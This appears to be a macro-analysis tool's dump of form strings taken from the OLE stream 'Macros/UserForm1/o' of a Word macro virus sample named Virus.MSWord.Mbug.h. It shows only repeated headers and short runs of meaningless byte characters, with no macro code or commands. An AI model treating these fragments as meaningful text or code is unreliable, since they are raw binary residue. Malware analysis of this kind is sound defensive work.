- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%9')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)9)93#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)BJBJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9RRBJ199!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99JZKUgZsJBB3.+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
))!)kVc�~��w))!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)B3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)9[Zl3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!9)9999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
199k^g[ZlB9B3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
991ZKUk^gJJR<.<!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JJZ�~���3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#))%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9RZKU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)BBR)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)ZKUk^gk^gJBB3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)J9ReYVkVcB9B)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9J���~999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
))%9999')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BBRJJR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)J9R)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)kksemcZk9)93.+!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B9BPZmk^gZKU9)9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%9kk��BB9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!')-')-1)B9993#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!XFmBFF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cRkwoswosZKU3.+)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)B^Rc^Rck^gJJR3.+!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)xcs�~<<?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)3#)999199)%93.+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!')-')-!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)B9)9))!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)[Zl3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
')-k^g{�k^gJBJ)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!ZKU^Rck^gZKU<.<3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)Bxcs���JBB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)3#)999199)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)3#)3#))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9B9BB9B=-1!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)BJJR!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!)3#)3#)3#)3#))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)BJJR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<.<�o�wos^Rc3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!JBBPZm^RckVcJJR9993#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%9kVc�~�ZKU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%91993.D<.<199!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)3#))%93#))!))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%9B9BJBBJJRZKURBB3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!JJZJJZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!)3#)3#))!)3#)3#)=-11!!1!!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)B/V<<?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kVc{u~k^gOGG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!9)9cZk^RcJJR^RcJJR<.<!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!JJR�~ZKU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
')-3#)3.D9993#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!))%93.+)!))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)9)9JBBJBBOGGZKUZKURBJ)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%9JJRN?V$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!)3#))!)3#)3#)=-11%1=-19)93#)3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JJZJJR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)�o��w[Zl999!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!JJR^RcZKU^RcPZmJBB)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B9JkkeYV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)B9)93.D991)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#)1999)9999')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)9)9999JBBZKUZKUOGGeYVZKUB9B!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!B9BcRkPZmXFm!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!)3#)3#)3#)3#)1%1=-11%1=-11%1=-1=-13#)3#)1!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)LHkB9B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BBR��wosZKU3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J99kVck^gPZmZKUZKUJBJ)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!xcsZKU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9199B9B1)B3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)1)B199199$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)=-1F-=JBBZKUeYVJBBJBBZKUk^gccckVckka[~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#)3#)9)99)93#)3#)1%1=-11%1=-1=-1=-1=-1F-=9993.+3#))
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)XFmJJR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)ZKU��kVcB9B')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%9JJR^Rck^gZKUcZkJJZBB9)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!ZKUZKU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%99)93.D9993.+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9)%93#)3.D991$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9919)9JBBZKUeYVZKUJ99B9BRBBJBBZKUkVceYV99J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)!)3#)3#)3#)3#)3.+9)93#)=-1=-1=-19)99)93.+9)99999)99)9=-13#))!))
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)LHkRBB1)Bxcs��NPT<.<3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZKU[Zlk^gccciiqk^g^RcB9B3#))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9RZKU!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
')-1)B9)93.D3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%91)B<.<9)9199)!))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!<.<JBBRBBZKUsZcJBB<.<B9BJBBJBBZKURBJkVcZKURBJ1)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)!))!)3#)3#)3#)3.+1%1=-11%1=-13#)9)9999999999999999=-1991=-13#)=-13#))!))
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9XFmJJRJJR�o|k^gJBJ3#))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JBBcZk^Rck^gum��o|semkVcOGGBBR1)B!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
199B9B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)B!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!19999JB9B3.+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)1)B1)B99J99J9913#)')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)9)9RBBkVcZKUk^gOGGRBBJ99JBBOGGZKURBJRBBZKUkVceYVZKU3#)')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)%91!!3#)3#)3#)<.<3#)=-11%1=-1=-1=-1999999F-=<.<=-1<.<=-1=-13#)=-13#))!))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)XFm^Rciiqsx�NPT991)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)9eYV^RckVc�o|um�{�wosk^gZKUkVcJBJ3.+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)B9)999J3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!19999J99J9)999J199)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B9BZKUeYV�mnZKUkVceYVJBBF-=JBBZKURBBR9BeYVZKUZKUsZckVcRBJ9)9)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
